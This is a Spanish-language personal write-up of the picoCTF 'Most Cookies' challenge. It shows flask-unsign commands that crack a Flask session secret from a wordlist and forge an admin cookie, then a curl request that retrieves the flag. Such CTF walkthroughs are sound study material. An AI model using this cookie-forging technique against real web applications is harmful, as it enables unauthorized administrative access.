
## Reto
Most Cookies

## Descripcion
Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/60f76192f6e1fea6f4e6e8c5fc9a6a27/server.py) [http://mercury.picoctf.net:44693/](http://mercury.picoctf.net:44693/

## Solucion
- Abrimos la pagina y nos da un cuadro de texto
- Al poner cualquier cosa nos genera una cookie encriptada con flask
- para desincreptarla usaremos flask-unsign de python
- al tratar de instalarlo nos marca error por lo que usaremos un entorno virtual
```
python -m venv ~/.venv 
source ~/.venv/bin/activate 
pip3 install flask-unsign
```
- como nos dieron el codigo fuente con todas las listas de palabras creamos `nano cookies.txt` y dentro ponemos la lista de todas las palabras posibles separadas por salto de linea
- usando esa lista aplicamos `flask-unsign --unsign --cookie "[cookie copiada]" --wordlist cookies.txt` y nos regresa la palabra secreta

- Con la palabra secreta ahora aplicamos `flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret '[palabra secreta]' [cookie copiada]` 
  y nos regresa una cookie de admin

- Ahora aplicamos `curl -s http://mercury.picoctf.net:65344/display -H "Cookie: session=[cookie admin]" | grep pico` para que nos regrese la respuesta de admin y encontrar la bandera facil con un grep

## ALT
- correr un script que no me funciono
## Notas
- una cookie de flask no es muy segura y depende de como las configuramos
- trate de seguir una solucion pero no me da
- luego veo un video para poder subirlo bien

### **No se porque nomas me funciono 1 vez pero la bandera no sirvio y ya no volvio a servir**

![[Pasted image 20250929150335.png]]
## Referencias
[PicoCTF 2021 — Most Cookies - Private User HQ - Medium](https://medium.com/private-user-hq/picoctf-2021-most-cookies-7f3d8b6cd0b)